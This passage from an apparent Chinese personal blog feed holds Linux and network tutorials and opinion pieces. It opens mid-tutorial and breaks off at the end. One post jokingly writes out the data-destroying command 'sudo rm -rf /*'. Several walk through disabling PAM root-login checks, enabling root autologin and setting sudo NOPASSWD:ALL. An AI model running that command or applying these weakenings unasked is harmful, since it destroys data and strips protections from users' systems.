将Yes改为No    </p><p>我的设置如下：<br>A -    Serial Device      : /dev/ttyUSB0                                                    我的机器只有一个串口，所以为0<br>B - Lockfile Location     : /var/run                                                    lockfile路径默认<br>C -   Callin Program      :<br>D -  Callout Program      :<br>E -    Bps/Par/Bits       : 9600 8N1                                                    设置波特率 9600<br>F - Hardware Flow Control : No                                                      关闭硬件流量控制<br>G - Software Flow Control : No                                                       关闭软件流量控制</p><p>设置完后按回车确认。</p><h3 id="第四步：保存设置"><a href="#第四步：保存设置" class="headerlink" title="第四步：保存设置"></a>第四步：保存设置</h3><p>选中   | Save setup as dfl        |    回车<br>       选中   | Exit from Minicom        |   回车退出</p><h3 id="第五步：连接交换机console"><a href="#第五步：连接交换机console" class="headerlink" title="第五步：连接交换机console"></a>第五步：连接交换机console</h3><p>sudo minicom</p><p>注意：连接之后可能没有反应，按几下回车便有显示。</p><p>连接界面如下：</p><pre><code>Welcome to minicom 2.7.1OPTIONS: I18n Compiled on Sep 28 2019, 15:24:37.Port /dev/ttyUSB0, 16:13:18Press CTRL-A Z for help on special keysRuijie&gt;Ruijie&gt;enPassword:*********Ruijie#</code></pre>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>manjaro安装deb包</title>
      <link href="/2020/05/25/2020-05-26-manjaro%E5%AE%89%E8%A3%85deb%E5%8C%85/"/>
      <url>/2020/05/25/2020-05-26-manjaro%E5%AE%89%E8%A3%85deb%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<p>manjaro自带的软件商店已经有很多软件了，基本上能够满足日常使用的需求，如果没有，后面还有个AUR（yay）撑着，pacman和yay两者几乎能解决普通用户需求的所有软件，除个别软件例外……例如simplenote</p><a id="more"></a><p>自从用了linux做了主力系统之后，就喜欢上了一个软件simplenote，它是一个免费开源跨平台的一个笔记软件，以简单著称。我用windows系统时一直都是使用OneNote，但OneNote没有linux系统版本，于是我被迫去寻找一个替代品，在网络上很多人都推荐simplenote，我试用了以后，就将它列为了linux系统必装的软件。从ubuntu系统换成manjaro系统之后发现pacman和yay上都没有这个包，一开始我打算下载simplenote的源码包进行编译安装的，但我在网络上看到了一种安装deb包的方法，所以试了一下。</p><h4 id="安装流程："><a href="#安装流程：" class="headerlink" title="安装流程："></a>安装流程：</h4><p>使用debtap工具进行解包</p><p>首先查看电脑上是否安装过<br>sudo pacman -Q debtap</p><p>安装yay工具<br>sudo pacman -S yay</p><p>安装解包打包工具debtap<br>yay -S debtap</p><p>升级debtap<br>sudo debtap -u</p><p>先去官网下载simplenote的deb包。</p><p>解包<br>sudo debtap Simplenote-linux-1.16.0-amd64.deb</p><p>安装<br>sudo pacman -U simplenote-1.16.0-1-x86_64.pkg.tar.zst</p><p>到此就安装完成了，我亲自测试使用，没有发现什么问题。</p><p>后面我又需要安装xmind，pacman上没有包，用yay -S xmind安装会报错，于是我又用了安装deb包的方法安装了，也能正常使用。对普通用户来说还是挺方便的。喜欢复杂点的就建议使用编译源码包的方法安装。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>manjaro显示伪输出</title>
      <link href="/2020/05/25/2020-05-26-manjaro%E6%98%BE%E7%A4%BA%E4%BC%AA%E8%BE%93%E5%87%BA/"/>
      <url>/2020/05/25/2020-05-26-manjaro%E6%98%BE%E7%A4%BA%E4%BC%AA%E8%BE%93%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>manjaro没有声音输出，显示伪输出</p><a id="more"></a><h3 id="故障现象："><a href="#故障现象：" class="headerlink" title="故障现象："></a>故障现象：</h3><p>网页播放视频的时候发现没有声音输出，用其他软件也没有声音输出，检查过并没有调静音的操作。查看系统设置声音选项那里显示输出设备显示“伪输出”，正常情况下应该是“扬声器-内置音频”。</p><p>附加：还有一种情况，也是我刚遇到的，就是电脑要接入一个显示器，然后电脑就没声音了，去看一下声音选项那里也是看不到“扬声器-内置音频”了，处理手法也是跟下面一样。</p><p>这是两种遇到概率较高的故障现象，所以拿出来讲讲。</p><h3 id="故障原因分析："><a href="#故障原因分析：" class="headerlink" title="故障原因分析："></a>故障原因分析：</h3><p>可能是之前在网页播放视频时，并没有退出播放视频的页面就直接盖下笔记本盖子了，后面打开笔记本盖子时，声音程序（pulseaudio ）并没有唤醒。</p><h3 id="故障处理："><a href="#故障处理：" class="headerlink" title="故障处理："></a>故障处理：</h3><p>打开系统检测器：<br>搜索输入：pulseaudio<br>从显示上可以看出pulseaudio 正处于睡眠状态。<br>选中pulseaudio 选择结束进程，结束后它会自动重启。<br>再次查看显示状态是运行状态。<br>查看系统设置声音选项显示已经是“扬声器-内置音频”。<br>打开网页视频已经正常有声音。</p><h3 id="结语："><a href="#结语：" class="headerlink" title="结语："></a>结语：</h3><p>遇到问题仔细看下故障现象，然后推断一下故障的原因，总是能找到蛛丝马迹的，如果实在想不到就上网查下，不要硬着头皮在那里想半天。<br>处理的方法有多种，可以用top、ps之类的，找到PID进程号杀掉就行了。我用的是manjaro桌面系统，为了省事就直接打开图形的系统监视器处理了，当然重启系统也是可以解决问题的。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>manjaro的优点</title>
      <link href="/2020/05/22/2020-05-23-manjaro%E7%9A%84%E4%BC%98%E7%82%B9/"/>
      <url>/2020/05/22/2020-05-23-manjaro%E7%9A%84%E4%BC%98%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<p>前段时间，我在物理机上安装了最新的ubuntu20.04，使用体验挺不好的，linux桌面版还有很长的路要走，后面我心灰意冷的用回了win10，毕竟电脑在使用过程中，稳定才是王道。换回windows系统之后，我不是很甘心，因为我只用了ubuntu20.04就否定了linux桌面版，这明显是很不严谨的定论，于是，我又开始折腾了。</p><a id="more"></a><p>我搜索了一番之后，目标定在了kali、Fedora、manjaro这三大系统上面，kali代表debian阵容、Fedora代表redhat阵容、manjaro代表arch阵容，经过一番筛检之后，我最后选择了manjaro，筛检的原因也很简单，kali在虚拟机上使用了很长时间了，我是挺喜欢它的，但不够稳定，我曾试过更新kali后重启就进不了系统了。现在新版本的kali可能比较稳定了，但选择主力系统时还是力求稳定为主，所以kali只能继续呆在我的虚拟机上了。我在虚拟机上也试用了Fedora、manjaro，我想尽可能的找出他们的优点和缺点，对比了一番，发现两者都很优秀，Fedora有一个点让我放弃了，就是它的gnome dock不能定制，我更喜欢的是像ubuntu那样的dock，看起来有特色，manjaro可以定制。</p><p>物理机使用了manjaro十多天后，我简单的概述一下它的优点和缺点</p><ol><li><p>界面漂亮颜值高</p></li><li><p>定制性更高</p></li><li><p>软件库资源非常多，几乎能涵盖了日常使用所需的软件</p></li><li><p>能够通过自带的软件安装最新版本的显卡驱动，简单方便</p></li><li><p>稳定性更高，至上比ubuntu高了去了</p></li><li><p>系统更加完善，并没有ubuntu那么多bug</p></li><li><p>招牌优点：滚动性更新，我喜欢这点</p></li><li><p>安装使用搜狗输入法，这点也好评，毕竟搜狗输入法linux版本还是挺好用的</p></li><li><p>这是能够作为主力系统的代表性linux系统</p></li></ol><p>6月22日更新：</p><p>使用manjaro作为主力系统已经一个半月了，说真的，我逐渐不用windows系统了，win10系统现在是躺在我的虚拟机中作为临时备用系统。使用manjaro中间虽然曾出现过一次gnome-shell占用cpu100%而卡死的情况，但重启电脑后就没有再出现过了，稳定性还是挺让人满意的; 用了一段时间Linux系统了，让我感受最深的是：Linux的定制性比windows好太多了，我喜欢Linux 。但不得不说，用Linux还是有系统点折腾的，普通用户还是在虚拟机上尝试一下即可。</p><p>虽然我还是采用win10+manjaro双系统的形式，但我已经渐渐地忘记了windows系统了，这段时间都在用manjaro，目前为止还没发现重大的缺点，如果有人想使用linux系统作为主力系统，我会推荐manjaro。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>体验ubuntu20.04的使用感受</title>
      <link href="/2020/05/15/2020-05-16-%E4%BD%93%E9%AA%8Cubuntu20.04%E7%9A%84%E4%BD%BF%E7%94%A8%E6%84%9F%E5%8F%97/"/>
      <url>/2020/05/15/2020-05-16-%E4%BD%93%E9%AA%8Cubuntu20.04%E7%9A%84%E4%BD%BF%E7%94%A8%E6%84%9F%E5%8F%97/</url>
      
        <content type="html"><![CDATA[<p>从ubuntu20.04 四月二十四日发布到现在，我使用了有二十来天了，今天就简单说下使用感受。我装的是win10与ubuntu双系统。</p><a id="more"></a><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><p>界面新鲜且好看</p><p>你没看错，就一条优点而已</p><h4 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h4><ol><li><p>驱动是个绝对硬伤，所有驱动都是兼容性驱动，勉强能用，但效果不理想。</p></li><li><p>时而会有花屏现象。</p></li><li><p>我连的是蓝牙鼠标，会经常卡一下。</p></li><li><p>声音就是听个响，音质实在不敢恭维。</p></li><li><p>屏幕亮度也是个硬伤，每次开机都是恢复到一个亮度，偏亮，不能记录亮度，日志天天报错：Failed to get backlight or LED device ‘backlight:nvidia_0’: No such device</p></li><li><p>不会自动息屏，我已经设置了五分钟息屏，但没有用，屏幕会一直亮着。</p></li><li><p>程序经常卡死崩溃，实在是不稳定。</p></li><li><p>系统也不稳定，我都已经重装过一次系统了，因为gnome-shell频繁占用cpu 100%，但找不出是什么原因导致占用cpu100%的，只能重装了事。</p></li><li><p>自带的ibus输入法实在是难用的要命，我现在装的是谷歌拼音，因为搜狗还不兼容，装不了。</p></li><li><p>软件也是个绝对硬伤，更新慢，软件少，且有太多的软件还不兼容ubuntu20.04了，这是大多数用户望而却步的鸿沟了。</p></li><li><p>国产软件几乎都还不兼容20.04</p></li><li><p>点击左下角的显示应用程序按钮时，结果显示经常会有图标重叠现象，要再多点击一下才会正常，强迫症表示难受。</p></li><li><p>自带的软件商店真的是难用，绝对差评。</p></li><li><p>打开几个虚拟机就卡死，内存管理机制还是不够完善。</p></li><li><p>还有很多我没有列出来。。。</p></li></ol><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>实在是有太多缺点了，说都说不完，这系统给人的感觉就是个测试版的系统，不成熟且容易崩。bug多的数不过来。linux系统在服务器领域是个非常牛逼的存在，但在桌面领域还有很长的路要走。建议还是在虚拟机上尝试ubuntu20.04即可，在物理机上实在是太折腾了。还有，这么多缺点的系统我为什么还在用？因为我看中的是它的优点。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 生成、查看文件的MD5、SHA、SHA256值</title>
      <link href="/2020/05/11/2020-05-12-%E7%94%9F%E6%88%90%E3%80%81%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E7%9A%84MD5%E3%80%81SHA%E3%80%81SHA256%E5%80%BC/"/>
      <url>/2020/05/11/2020-05-12-%E7%94%9F%E6%88%90%E3%80%81%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E7%9A%84MD5%E3%80%81SHA%E3%80%81SHA256%E5%80%BC/</url>
      
        <content type="html"><![CDATA[<p>Linux系统生成MD5、SHA、SHA256</p><p>md5sum filename  &gt;&gt; MD5.txt</p><p>sha1sum filename &gt;&gt; SHA1.txt</p><p>sha256sum filename &gt;&gt; SHA256.txt</p><a id="more"></a><p>Linux系统查看 MD5、SHA、SHA256</p><p>md5sum filename</p><p>sha1sum filename</p><p>sha256sum filename</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos7.7升级到centos7.8</title>
      <link href="/2020/05/10/2020-05-11-centos7.7%E5%8D%87%E7%BA%A7%E5%88%B0centos7.8/"/>
      <url>/2020/05/10/2020-05-11-centos7.7%E5%8D%87%E7%BA%A7%E5%88%B0centos7.8/</url>
      
        <content type="html"><![CDATA[<p>最近发布了CentOS7.8，算是常规更新吧，变化不大，我的服务器使用的是7.7，就打算升级到7.8  步骤如下。</p><a id="more"></a><h3 id="1-备份："><a href="#1-备份：" class="headerlink" title="1.备份："></a>1.备份：</h3><p>数据备份，带有任何不确定性操作之前都需要进行数据备份。</p><h3 id="2-查看系统版本："><a href="#2-查看系统版本：" class="headerlink" title="2.查看系统版本："></a>2.查看系统版本：</h3><p>cat /etc/redhat-release</p><h3 id="3-更新yum源"><a href="#3-更新yum源" class="headerlink" title="3.更新yum源"></a>3.更新yum源</h3><p>yum默认的镜像很慢，需要更新国内镜像</p><p>cd  /etc/yum.repos.d/    </p><p>wget <a href="http://mirrors.163.com/.help/CentOS7-Base-163.repo" target="_blank" rel="noopener">http://mirrors.163.com/.help/CentOS7-Base-163.repo      </a></p><p>cp CentOS-Base.repo  CentOS-Base.repo.bak    </p><p>cp CentOS7-Base-163.repo   CentOS-Base.repo</p><h3 id="4-检查是否可更新到7-8"><a href="#4-检查是否可更新到7-8" class="headerlink" title="4.检查是否可更新到7.8"></a>4.检查是否可更新到7.8</h3><p>yum check-update  | grep centos-release </p><h3 id="5-更新"><a href="#5-更新" class="headerlink" title="5.更新"></a>5.更新</h3><p>sudo yum update</p><p>更新完成，会看到Complete!</p><h3 id="6-检查一下："><a href="#6-检查一下：" class="headerlink" title="6.检查一下："></a>6.检查一下：</h3><p>cat  /etc/redhat-release </p><h3 id="7-重启"><a href="#7-重启" class="headerlink" title="7.重启"></a>7.重启</h3><p>reboot</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu20.04设置普通用户sudo不用输密码</title>
      <link href="/2020/05/09/2020-05-10-ubuntu20.04%E8%AE%BE%E7%BD%AE%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7sudo%E4%B8%8D%E7%94%A8%E8%BE%93%E5%AF%86%E7%A0%81/"/>
      <url>/2020/05/09/2020-05-10-ubuntu20.04%E8%AE%BE%E7%BD%AE%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7sudo%E4%B8%8D%E7%94%A8%E8%BE%93%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>现在很多的linux系统都禁止使用root用户登录了，在装系统的时候都强制要创办一个普通用户，虽然用意是为了系统安全，但使用过程中就遇到了一个问题，就是使用sudo的时候要频繁输入密码，实在是太麻烦了。</p><a id="more"></a><p><strong>一般解决方法有两种：</strong></p><h3 id="第一种方法：设置root用户自动登录"><a href="#第一种方法：设置root用户自动登录" class="headerlink" title="第一种方法：设置root用户自动登录"></a>第一种方法：设置root用户自动登录</h3><p>这个确实是非常直接的解决办法，ubuntu20.04默认是禁止使用root用户登录，但我们可以手动设置root用户登录，然后为所欲为。其设置过程也不难，linux系统是开源的，系统的所有设置都可以修改，只要你开心，你修改内核也是可以的，甚至一兴奋执行sudo rm -rf /* 也是没人会拦你的，毕竟你的系统是真正的由你做主的，当然咯，在自己的电脑上才可以这么任性，在生产环境就得以安全为主了。</p><p>设置方法：</p><h4 id="1-设置root密码"><a href="#1-设置root密码" class="headerlink" title="1.设置root密码"></a>1.设置root密码</h4><p><code>sudo passwd root</code></p><h4 id="2-设置50-unity-conf"><a href="#2-设置50-unity-conf" class="headerlink" title="2.设置50-unity.conf"></a>2.设置50-unity.conf</h4><p><code>sudo vim /usr/share/lightdm/lightdm.conf.d/50-unity.conf</code></p><pre><code class="bash">[Seat:*]user-session=ubuntuautologin-guest=falseautologin-user=rootautologin-user-timeout=0greeter-session=lightdm-gtk-greeter</code></pre><h4 id="3-修改-etc-pam-d-下文件"><a href="#3-修改-etc-pam-d-下文件" class="headerlink" title="3.修改/etc/pam.d/下文件"></a>3.修改/etc/pam.d/下文件</h4><p><code>sudo vim /etc/pam.d/gdm-autologin</code></p><pre><code class="bash">#auth   required    pam_succeed_if.so user != root quiet_success</code></pre><p><code>sudo vim /etc/pam.d/gdm-password</code></p><pre><code class="bash">#auth   required    pam_succeed_if.so user != root quiet_success</code></pre><p><code>sudo vim /etc/pam.d/gdm-fingerprint</code></p><pre><code class="bash">#auth   required    pam_succeed_if.so user != root quiet_success</code></pre><h4 id="4-修改-root-profile文件"><a href="#4-修改-root-profile文件" class="headerlink" title="4.修改/root/.profile文件"></a>4.修改/root/.profile文件</h4><p><code>sudo vim /root/.profile</code><br> 文档最后一行 mesg n || true 前添加 tty -s &amp;&amp; 即 tty -s &amp;&amp;mesg n || true</p><h4 id="5-修改-etc-gdm3-custom-conf"><a href="#5-修改-etc-gdm3-custom-conf" class="headerlink" title="5.修改/etc/gdm3/custom.conf"></a>5.修改/etc/gdm3/custom.conf</h4><p><code>sudo vim /etc/gdm3/custom.conf</code></p><pre><code class="bash"># Enabling automatic loginAutomaticLoginEnable = trueAutomaticLogin = root</code></pre><p>这种方法有个弊端，出于安全原因，谷歌浏览器和VLC播放器无法使用了。谷歌浏览器只能在普通用户下使用，因为我是要使用谷歌浏览器的，所以我要妥协用回普通用户了。</p><h3 id="第二种方法：设置普通用户sudo不用输密码"><a href="#第二种方法：设置普通用户sudo不用输密码" class="headerlink" title="第二种方法：设置普通用户sudo不用输密码"></a>第二种方法：设置普通用户sudo不用输密码</h3><p>网络上有很多种方法，但不使用ubuntu20.04，后面才查到了这个方法，亲测有效。</p><p><code>sudo vim /etc/sudoers</code></p><pre><code class="bash">%sudo   ALL=(ALL:ALL) ALL   修改为  %sudo   ALL=(ALL:ALL) NOPASSWD:ALL</code></pre>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu20.04 安装shadowsocks-qt5</title>
      <link href="/2020/05/07/ubuntu20.04-%E5%AE%89%E8%A3%85shadowsocks-qt5/"/>
      <url>/2020/05/07/ubuntu20.04-%E5%AE%89%E8%A3%85shadowsocks-qt5/</url>
      
        <content type="html"><![CDATA[<p>很多人不想用linux系统作为主用系统，最大的原因就是软件方面的问题，上手难度有点高，不像windows那样拿来就用。像ubuntu20.04这种最新的系统就更折腾了，很多软件都还没适配，实在是令人抓狂。网络上常见有三种方法安装shadowsocks-qt5，我都试过了，只有我现在要说的这种方法有效。</p><a id="more"></a><h3 id="第一种：（失败）"><a href="#第一种：（失败）" class="headerlink" title="第一种：（失败）"></a>第一种：（失败）</h3><pre><code>sudo add-apt-repository ppa:hzwhuang/ss-qt5         未兼容，添加失败。sudo apt-get update sudo apt-get install shadowsocks-qt5</code></pre><h3 id="第二种：（乱码）"><a href="#第二种：（乱码）" class="headerlink" title="第二种：（乱码）"></a>第二种：（乱码）</h3><p><code>sudo snap install shadowsocks-qt5</code>         系统为中文的话，安装完后会乱码</p><h3 id="第三种：（可行）"><a href="#第三种：（可行）" class="headerlink" title="第三种：（可行）"></a>第三种：（可行）</h3><h4 id="第一步：准备文件"><a href="#第一步：准备文件" class="headerlink" title="第一步：准备文件"></a>第一步：准备文件</h4><p><code>sudo apt-get install synaptic</code>    安装新立德包管理器，后面用的上<br><code>sudo apt-get install cmake qtbase5-dev libqrencode-dev libzbar0 libappindicator1 libzbar-dev</code>    安装相关依赖。</p><p><code>git clone https://github.com/shadowsocks/shadowsocks-qt5</code>    下载shadowsocks-qt5<br><code>git clone https://github.com/shadowsocks/libQtShadowsocks</code>    下载libQtShadowsocks<br><code>wget https://botan.randombit.net/releases/Botan-2.9.0.tgz</code>        下载Botan，具体最新版本可去查看一下，目前最新版本是2.9.0</p><h4 id="第二步：要按顺序安装"><a href="#第二步：要按顺序安装" class="headerlink" title="第二步：要按顺序安装"></a>第二步：要按顺序安装</h4><p>先安装Botan：</p><pre><code>tar xvf Botan-2.9.0.tgzcd Botan-2.9.0./configure.pymake -j4sudo make installsudo ldconfig</code></pre><p>再安装libQtShadowsocks ：</p><pre><code>cd libQtShadowsocks mkdir build &amp;&amp; cd buildcmake .. -DUSE_BOTAN2=ONmake -j4sudo make install</code></pre><p>最后安装shadowsocks-qt5：</p><pre><code>cd shadowsocks-qt5mkdir build &amp;&amp; cd buildcmake .. make -j4sudo make install</code></pre><p>安装完毕后，终端输入：ss-qt5  或者 点击图标来打开shadowsocks-qt5，如果能打开是最好的，我的就不能打开。<br>打不开的解决方法：<br>终端输入：<code>sudo apt install -f</code>    看看有没有缺失的依赖需要安装，如果没有就打开新立德包管理器，选择“推荐的软件包丢失“，刷新一下，这时候应该会出现一些包需要安装，右键选择“标记以便安装“，点击“应用“，安装完后应该就能打开了，我尝试了两次都能安装成功，如果你的不能成功就要找找原因了。或许步骤没做对，或者系统不兼容。</p><p>支持chacha20-ietf-poly1305协议</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华为交换机常用查看指令</title>
      <link href="/2020/04/30/%E5%8D%8E%E4%B8%BA%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B8%B8%E7%94%A8%E6%9F%A5%E7%9C%8B%E6%8C%87%E4%BB%A4/"/>
      <url>/2020/04/30/%E5%8D%8E%E4%B8%BA%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B8%B8%E7%94%A8%E6%9F%A5%E7%9C%8B%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>display version，显示系统版本。</p><p>display clock [ utc ]，显示系统时钟。</p><p>display saved-configuration，显示起始配置信息。</p><p>display current-configuration，显示当前配置信息。</p><a id="more"></a><p>display this，显示当前视图的运行配置。</p><p>display user-interface  命令查看当前系统中的绝对编号。</p><p>display diagnostic-information [ file-name ]，显示系统诊断信息。</p><p>display users [ all ]命令显示用户界面的使用信息。</p><p>display user-interface console ui-number1 [ summary ]命令显示用户界面的物理属性和配置。</p><p>display local-user命令查看本地用户列表。</p><p>display access-user命令查看在线用户。</p><p>display users，可以查看当前用户界面的使用信息。</p><p>display ip interface [ brief ] [ interface-type [ interface-number ] ]命令查看接口的IP配置信息。</p><p>display interface [ interface-type [ interface-number ] ]命令查看接口的信息。</p><p>display interface brief 查看物理端口的物理状态</p><p>display arp all  查看整机所有单板ARP表项数量(已经去除重复的ARP表项)</p><p>display arp statistics all  该命令查询的是整机所有单板(主控板+接口板)的ARP表项数量</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali linux系统设置root用户自动登录解决方法</title>
      <link href="/2020/04/02/kali%20linux%E8%AE%BE%E7%BD%AEroot%E7%94%A8%E6%88%B7%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2020/04/02/kali%20linux%E8%AE%BE%E7%BD%AEroot%E7%94%A8%E6%88%B7%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>kali linux 2020版本其中有一个变动的地方就是不能再以root用户登录系统了，就是只能以普通用户身份登录，每次使用有很大的不方便，每次都要手动切换root用户，切换多了感觉就很繁琐，索性就设置默认以root用户登录，省事多了。当然在个人电脑才这么玩，如果是生产环境下的机器还是普通用户保险点。</p><a id="more"></a><h3 id="第一步：先给root用户设个密码"><a href="#第一步：先给root用户设个密码" class="headerlink" title="第一步：先给root用户设个密码"></a>第一步：先给root用户设个密码</h3><pre><code>$sudo passwd root输入密码：再次输入密码：</code></pre><h3 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h3><pre><code>sudo vim /etc/pam.d/gdm-autologin注释行 “auth requied pam_succeed_if.so user != root quiet success”</code></pre><pre><code>sudo vim /etc/pam.d/gdm-password注释行 “auth requied pam_succeed_if.so user != root quiet success”</code></pre><p><strong>到这一步便可以使用root用户登录了</strong></p><h3 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h3><pre><code>vim /etc/gdm3/daemon.conf</code></pre><pre><code>[daemon]# Uncomment the line below to force the login screen to use Xorg#WaylandEnable=false# Enabling automatic login  AutomaticLoginEnable = true    **#改成true**  AutomaticLogin = root         **#改成root**# Enabling timed login#  TimedLoginEnable = true#  TimedLogin = user1#  TimedLoginDelay = 10#AutomaticLoginEnable=False#AutomaticLogin=kali     **#注释掉普通用户**</code></pre><h3 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h3><pre><code>vim /etc/lightdm/lightdm.confautologin-user=root</code></pre><h3 id="第五步："><a href="#第五步：" class="headerlink" title="第五步："></a>第五步：</h3><p>重启系统：reboot</p><p><strong>开机之后便会自动以root用户登录系统了，密码都不用输，简直是懒癌的福音。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos系统设置笔记本盖下不休眠</title>
      <link href="/2020/02/11/centos%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%9B%96%E4%B8%8B%E4%B8%8D%E4%BC%91%E7%9C%A0/"/>
      <url>/2020/02/11/centos%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%9B%96%E4%B8%8B%E4%B8%8D%E4%BC%91%E7%9C%A0/</url>
      
        <content type="html"><![CDATA[<p>安装了centos8.1系统之后出现了一个问题，就是无论多久不使用电脑，屏幕一直都是亮着的，并不会自动息屏，以前安装centos7的时候是会自动息屏的。因为centos8笔记本是用来做服务器的，都是远程使用的，屏幕都是用不上的，屏幕一直亮着很是碍眼。所以要设置成盖下盖子而不会休眠。</p><p>通过网络查询，终于找到了设置的方法：</p><a id="more"></a><p>systemd 处理某些电源相关的 ACPI事件，可以通过从 /etc/system/logind.conf以下选项进行配置：</p><p>动作包括：</p><p>HandlePowerKey：按下电源键后的动作</p><p>HandleSleepKey：按下挂起键后的动作</p><p>HandleHibernateKey: 按下休眠键后的动作</p><p>HandleLidSwitch：合上笔记本盖后待机</p><p>这些动作的值可以是 ignore（什么都不做） poweroff（关机） reboot（重新启动） halt（关机，和poweroff有什么区别，需要手动断开电源？） suspend（待机挂起） hibernate（休眠） 默认情况是，当我合上笔记本屏幕的时候，系统会待机。</p><p>如果我不想让系统在我合上笔记本的时候待机，怎么办呢？</p><p>用vim编辑器打开 /etc/systemd/logind.conf 去掉HandleLidSwitch前面的注释符号#，并把它的值从suspend修改为ignore or lock。</p><p>lock 仅锁屏，计算机继续工作</p><p>然后systemctl restart systemd-logind，使更改生效。再合上笔记本盖子，也不会待机了。</p><p>如果再想进入待机状态，可执行systemctl suspend。</p><p>原文链接：<a href="https://blog.csdn.net/nankys/article/details/86617948" target="_blank" rel="noopener">https://blog.csdn.net/nankys/article/details/86617948</a></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电脑中病毒</title>
      <link href="/2020/02/11/%E7%94%B5%E8%84%91%E4%B8%AD%E7%97%85%E6%AF%92/"/>
      <url>/2020/02/11/%E7%94%B5%E8%84%91%E4%B8%AD%E7%97%85%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<p>今天遇到了一件有意思的事情，上班时我发现有一台工作电脑屏幕上弹出一个很大界面的广告，本来因为有很多电脑乱安装软件或者安装不规范，导致会安装了一些流氓软件或者捆绑了很多不必要的垃圾软件，从而产生弹广告这些见怪不怪的事情了。由于屏幕上运行着监控软件，这个界面很大的广告几乎完全挡住监控界面了。这时候我必须要去关闭它了，不然看不到监控界面了。关闭的时候我还在感慨：现在的流氓软件真是太猖狂了，搞个广告都喜欢弄个这么大的。平时看到的弹广告都是电脑桌面右下角那里弹个小小的广告界面。我当时还觉得有点新鲜，还想随手拍个照片留底一下，后面想了想貌似之前双十一的时候也看过不少这么大的广告界面了，就懒得的拍照了，随手就点击关闭按钮。</p><a 